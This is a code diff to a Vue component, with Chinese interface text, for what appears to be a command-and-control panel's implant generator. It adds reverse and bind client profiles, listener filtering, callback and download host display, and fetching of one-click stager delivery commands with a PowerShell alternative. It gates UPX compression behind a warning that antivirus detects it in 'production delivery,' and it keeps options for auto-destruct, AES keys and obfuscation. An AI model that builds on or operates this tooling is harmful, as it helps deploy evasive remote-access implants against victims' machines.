@@ -4,6 +4,7 @@
       <div class="payload-toolbar__metrics">
         <div class="chip">活跃监听器 {{ activeListeners.length }}</div>
         <div class="chip">模式 {{ form.mode === 'build' ? '源码构建' : '模板补丁' }}</div>
+        <div class="chip">客户端 {{ profileLabel }}</div>
       </div>
     </section>
 
@@ -63,11 +64,11 @@
             <el-form-item label="监听器" required>
               <el-select
                 v-model="form.listenerId"
-                placeholder="选择一个运行中的监听器"
+                placeholder="按客户端类型筛选后的监听器"
                 @change="onListenerChange"
               >
                 <el-option
-                  v-for="listener in activeListeners"
+                  v-for="listener in filteredListeners"
                   :key="listener.id"
                   :label="`${listener.protocol} | 端口 ${listener.port}`"
                   :value="listener.id"
@@ -113,7 +114,7 @@
                 @click="form.mode = 'patch'"
               >
                 <span>模板补丁</span>
-                <small>秒级生成，适合快速投递</small>
+                <small>秒级生成</small>
               </button>
             </div>
 
@@ -121,6 +122,43 @@
               <el-icon><Cpu /></el-icon>
               <span>{{ modeDescription }}</span>
             </div>
+
+            <div class="section-title profile-section-title">
+              <span class="section-index">02b</span>
+              <div>
+                <strong>客户端类型</strong>
+                <p>仅两种方向：反向（回连）与正向（bind）。能力相同：终端/文件/进程内置；BOF/.NET 按需模块。</p>
+              </div>
+            </div>
+
+            <div class="profile-switch">
+              <button
+                v-for="item in profileOptions"
+                :key="item.value"
+                type="button"
+                class="profile-switch__item"
+                :class="{ 'profile-switch__item--active': form.profile === item.value }"
+                @click="onClientTypeChange(item.value)"
+              >
+                <span>{{ item.label }}</span>
+                <small>{{ item.caption }}</small>
+              </button>
+            </div>
+
+            <div class="mode-note profile-hint">
+              <el-icon><Cpu /></el-icon>
+              <span>{{ profileDescription }}</span>
+            </div>
+
+            <el-alert
+              type="info"
+              :closable="false"
+              show-icon
+              :title="form.profile === 'forward'
+                ? '正向：与反向同能力（~0.8MB 内置终端/文件/进程）。须选 正向TCP；生成后面板「正向接入」。BOF/.NET 走模块。'
+                : '反向：与正向同能力（~0.8MB 内置终端/文件/进程）。须选 TCP/WS/DNS。BOF/.NET 走模块。'"
+              class="profile-alert"
+            />
 
             <div class="option-grid">
               <div class="option-card">
@@ -135,12 +173,24 @@
                 <el-switch v-model="form.autoDestruct" />
               </div>
 
-              <div class="option-card">
+              <div class="option-card" :class="{ 'option-card--disabled': form.mode !== 'build' }">
                 <span class="option-card__label">UPX 压缩</span>
-                <strong>{{ form.useUPX ? '已启用' : '未启用' }}</strong>
-                <el-switch v-model="form.useUPX" />
+                <strong>{{ form.mode === 'build' && form.useUPX ? '已启用' : '未启用' }}</strong>
+                <el-switch
+                  v-model="form.useUPX"
+                  :disabled="form.mode !== 'build'"
+                />
               </div>
             </div>
+
+            <el-alert
+              v-if="form.mode === 'build' && form.useUPX"
+              type="error"
+              :closable="false"
+              show-icon
+              title="风险：现代 AV 对 UPX 特征敏感，生产投递不推荐。默认应保持关闭。"
+              class="profile-alert"
+            />
           </div>
 
           <div class="build-preview">
@@ -175,6 +225,25 @@
           </div>
 
           <div class="stager-state" v-loading="stagerLoading">
+            <p class="dialog-hint stager-host-hint">
+              <strong>下载地址</strong> = 当前面板 Host（目标机能访问的 Web 端口）；
+              <strong>回连地址</strong> = 上方「回连地址」+ 监听器端口（Agent C2）。
+              二者不要混用。
+            </p>
+            <div v-if="stagerMeta.panel_host || stagerMeta.callback" class="stager-meta">
+              <div class="stager-meta__row">
+                <span>面板下载 Host</span>
+                <code>{{ stagerMeta.panel_host || '—' }}</code>
+              </div>
+              <div class="stager-meta__row">
+                <span>Agent 回连 Host</span>
+                <code>{{ stagerMeta.callback || form.lhost || '—' }}</code>
+              </div>
+              <div class="stager-meta__row" v-if="stagerMeta.profile">
+                <span>客户端</span>
+                <code>{{ stagerMeta.profile_label || stagerMeta.profile }}</code>
+              </div>
+            </div>
             <template v-if="stagerCommand">
               <div class="terminal-card">
                 <div class="terminal-card__dots">
@@ -193,7 +262,7 @@
             </template>
 
             <div v-else class="empty-copy">
-              选择监听器和平台后，这里会自动生成对应的快速投递命令。
+              选择监听器和平台后，这里会自动生成对应的快速投递命令。若提示模板缺失，请先编译 assets 下 client_template_*。
             </div>
           </div>
         </article>
@@ -383,6 +452,7 @@ const loading = ref(false)
 const activeListeners = ref([])
 const stagerLoading = ref(false)
 const stagerCommand = ref('')
+const stagerMeta = ref({ panel_host: '', callback: '', profile: '', profile_label: '' })
 
 const currentTaskId = ref('')
 const terminalDialogVisible = ref(false)
@@ -411,8 +481,25 @@ const form = ref({
   aesKey: '',
   useUPX: false,
   encryption_salt: '',
-  obfuscation_mode: 'none'
+  obfuscation_mode: 'none',
+  // 两种产品：reverse/minimal=日常作业内置 | forward=正向全功能
+  profile: 'reverse'
 })
+
+const profileOptions = [
+  {
+    value: 'reverse',
+    label: '反向客户端',
+    caption: '回连 · 与正向同能力 ~0.8MB',
+    direction: 'reverse'
+  },
+  {
+    value: 'forward',
+    label: '正向客户端',
+    caption: '目标监听 · 与反向同能力 ~0.8MB',
+    direction: 'forward'
+  }
+]
 
 const platformGroups = computed(() => [
   {
@@ -441,11 +528,19 @@ const platformGroups = computed(() => [
   }
 ])
 
-const buildSteps = [
-  { id: 1, label: '环境检查' },
-  { id: 2, label: '核心编译' },
-  { id: 3, label: '压缩封装' }
-]
+const buildSteps = computed(() => {
+  const steps = [
+    { id: 1, label: '环境检查' },
+    { id: 2, label: '核心编译' }
+  ]
+  if (form.value.mode === 'build' && form.value.useUPX) {
+    steps.push({ id: 3, label: 'UPX 压缩' })
+    steps.push({ id: 4, label: '完成' })
+  } else {
+    steps.push({ id: 3, label: '完成' })
+  }
+  return steps
+})
 
 const selectedListener = computed(() =>
   activeListeners.value.find((listener) => listener.id === form.value.listenerId)
@@ -455,6 +550,20 @@ const isBindTcpListener = (protocol) => {
   const value = String(protocol || '').toLowerCase()
   return value === '正向tcp' || value === 'bind-tcp' || value === 'bind_tcp' || value.includes('bind')
 }
+
+const currentDirection = computed(() => {
+  const hit = profileOptions.find((p) => p.value === form.value.profile)
+  return hit?.direction || 'reverse'
+})
+
+/** 按客户端方向过滤监听器：反向=非 bind；正向=仅 bind */
+const filteredListeners = computed(() => {
+  const list = activeListeners.value || []
+  if (currentDirection.value === 'forward') {
+    return list.filter((l) => isBindTcpListener(l.protocol))
+  }
+  return list.filter((l) => !isBindTcpListener(l.protocol))
+})
 
 const previewUrl = computed(() => {
   if (!selectedListener.value) return '---'
@@ -468,19 +577,61 @@ const previewUrl = computed(() => {
 
 const modeDescription = computed(() => (
   form.value.mode === 'build'
-    ? '调用远程 Rust 构建链路，适合需要完整静态编译与更高对抗性的交付场景。'
-    : '基于预编译模板快速打补丁，适合需要秒级生成和批量分发的场景。'
+    ? '源码构建：正向/反向均为 minimal 同能力，仅协议方向不同（bind vs 回连）。'
+    : '模板补丁：秒级生成；建议源码构建以对齐 minimal 体积与能力。'
 ))
+
+const profileLabel = computed(() => {
+  const hit = profileOptions.find((p) => p.value === form.value.profile)
+  return hit ? hit.label : form.value.profile
+})
+
+const profileDescription = computed(() => {
+  const same =
+    '能力与另一方向完全一致：终端/文件/进程内置（约 0.8MB）；BOF、.NET 按需加载模块，不进默认包。'
+  if (form.value.profile === 'forward') {
+    return `正向客户端：目标机监听，面板主动接入。${same} 须选 正向TCP 监听器。`
+  }
+  return `反向客户端：Agent 主动回连。${same} 须选 TCP/WebSocket/DNS。`
+})
+
+const onClientTypeChange = (value) => {
+  form.value.profile = value
+  // 切换方向时若当前监听器不匹配则清空
+  const stillOk = filteredListeners.value.some((l) => l.id === form.value.listenerId)
+  if (!stillOk) {
+    form.value.listenerId = filteredListeners.value[0]?.id || ''
+    if (form.value.listenerId) {
+      const ln = activeListeners.value.find((l) => l.id === form.value.listenerId)
+      if (ln) onListenerChange(ln.id)
+    }
+  }
+}
 
 const stageLabel = computed(() => {
   if (buildStage.value <= 1) return '环境检查'
   if (buildStage.value === 2) return '核心编译'
-  if (buildStage.value === 3) return '压缩封装'
+  if (form.value.useUPX && buildStage.value === 3) return 'UPX 压缩'
   return buildFinished.value ? '已完成' : '处理中'
 })
 
+// 切到补丁模式时强制关闭 UPX（补丁不走 cargo UPX）
 watch(
-  [() => form.value.combinedType, () => form.value.listenerId, () => form.value.lhost],
+  () => form.value.mode,
+  (mode) => {
+    if (mode !== 'build') {
+      form.value.useUPX = false
+    }
+  }
+)
+
+watch(
+  [
+    () => form.value.combinedType,
+    () => form.value.listenerId,
+    () => form.value.lhost,
+    () => form.value.profile
+  ],
   () => {
     fetchStagerCommand()
   }
@@ -635,19 +786,19 @@ const attachBuildSocket = () => {
     if (payload.type === 'log') {
       pushTerminalLog(payload.content)
       const text = String(payload.content).toLowerCase()
-      if (text.includes('cargo') || text.includes('compiling')) {
+      if (text.includes('cargo') || text.includes('compiling') || text.includes('profile')) {
         buildStage.value = 2
         buildStatusText.value = '正在编译核心'
-      } else if (text.includes('upx')) {
+      } else if (text.includes('upx') && form.value.useUPX) {
         buildStage.value = 3
-        buildStatusText.value = '正在压缩封装'
+        buildStatusText.value = '正在 UPX 压缩'
       }
       return
     }
 
     if (payload.type === 'success') {
       pushTerminalLog(`[OK] ${payload.content}`)
-      buildStage.value = 4
+      buildStage.value = form.value.useUPX ? 4 : 3
       buildStatusText.value = '构建成功'
       buildFinished.value = true
       syncBuildTimer(false)
@@ -711,6 +862,12 @@ const doGenerate = async () => {
 
   loading.value = true
   try {
+    if (!filteredListeners.value.some((l) => l.id === form.value.listenerId)) {
+      ElMessage.warning('请选择与客户端类型匹配的监听器（反向 / 正向）')
+      loading.value = false
+      return
+    }
+
     const payload = {
       os: form.value.combinedType.split('_')[0],
       arch: form.value.combinedType,
@@ -720,9 +877,10 @@ const doGenerate = async () => {
       auto_destruct: form.value.autoDestruct,
       sleep_time: form.value.sleepTime,
       aes_key: form.value.aesKey,
-      use_upx: form.value.useUPX,
+      use_upx: form.value.mode === 'build' ? form.value.useUPX : false,
       encryption_salt: form.value.encryption_salt,
-      obfuscation_mode: form.value.obfuscation_mode
+      obfuscation_mode: form.value.obfuscation_mode,
+      profile: form.value.profile || 'reverse'
     }
 
     const response = await generateClient(payload)
@@ -758,22 +916,39 @@ const doGenerate = async () => {
 const fetchStagerCommand = async () => {
   if (!form.value.listenerId) {
     stagerCommand.value = ''
+    stagerMeta.value = { panel_host: '', callback: '', profile: '', profile_label: '' }
     return
   }
-
   stagerLoading.value = true
   try {
-    const os = form.value.combinedType.split('_')[0]
+    const parts = form.value.combinedType.split('_')
+    const os = parts[0]
+    const arch = parts.slice(1).join('_') || 'amd64'
+    // host = Agent 回连地址；下载域名由后端使用当前面板 Host，勿混用
     const response = await request.get('/api/stager', {
       params: {
         listener_id: form.value.listenerId,
         os,
-        host: form.value.lhost
+        arch,
+        host: form.value.lhost,
+        profile: form.value.profile || 'reverse'
       }
     })
-    stagerCommand.value = response.data.command
-  } catch {
+    stagerCommand.value = response.data.command || ''
+    if (response.data.command_ps) {
+      stagerCommand.value = `${response.data.command}\n\n:: PowerShell 备选\n${response.data.command_ps}`
+    }
+    stagerMeta.value = {
+      panel_host: response.data.panel_host || '',
+      callback: response.data.callback || form.value.lhost || '',
+      profile: response.data.profile || form.value.profile || '',
+      profile_label: response.data.profile_label || profileLabel.value
+    }
+  } catch (e) {
     stagerCommand.value = ''
+    stagerMeta.value = { panel_host: '', callback: '', profile: '', profile_label: '' }
+    const msg = e?.response?.data?.error || '一键上线命令生成失败'
+    ElMessage.error(msg)
   } finally {
     stagerLoading.value = false
   }
@@ -818,6 +993,91 @@ onUnmounted(() => {
   display: flex;
   gap: 10px;
   flex-wrap: wrap;
+}
+
+.stager-host-hint {
+  margin: 0 0 10px;
+  font-size: 12px;
+  line-height: 1.45;
+  opacity: 0.85;
+}
+
+.stager-meta {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  margin: 0 0 12px;
+  padding: 10px 12px;
+  border-radius: 10px;
+  background: rgba(0, 0, 0, 0.22);
+  border: 1px solid rgba(255, 255, 255, 0.06);
+}
+
+.stager-meta__row {
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  font-size: 12px;
+}
+
+.stager-meta__row span {
+  opacity: 0.7;
+  flex-shrink: 0;
+}
+
+.stager-meta__row code {
+  text-align: right;
+  word-break: break-all;
+  font-size: 12px;
+}
+
+.profile-switch {
+  display: grid;
+  grid-template-columns: repeat(3, minmax(0, 1fr));
+  gap: 10px;
+  margin-bottom: 12px;
+}
+
+.profile-switch__item {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  gap: 4px;
+  padding: 12px 14px;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-radius: 12px;
+  background: rgba(0, 0, 0, 0.18);
+  color: inherit;
+  cursor: pointer;
+  text-align: left;
+  transition: border-color 0.15s ease, background 0.15s ease;
+}
+
+.profile-switch__item span {
+  font-weight: 600;
+}
+
+.profile-switch__item small {
+  opacity: 0.72;
+  line-height: 1.35;
+}
+
+.profile-switch__item--active {
+  border-color: rgba(64, 158, 255, 0.65);
+  background: rgba(64, 158, 255, 0.12);
+}
+
+.profile-section-title {
+  margin-top: 8px;
+}
+
+.profile-hint,
+.profile-alert {
+  margin-bottom: 12px;
+}
+
+.option-card--disabled {
+  opacity: 0.55;
 }
 
 .payload-grid {
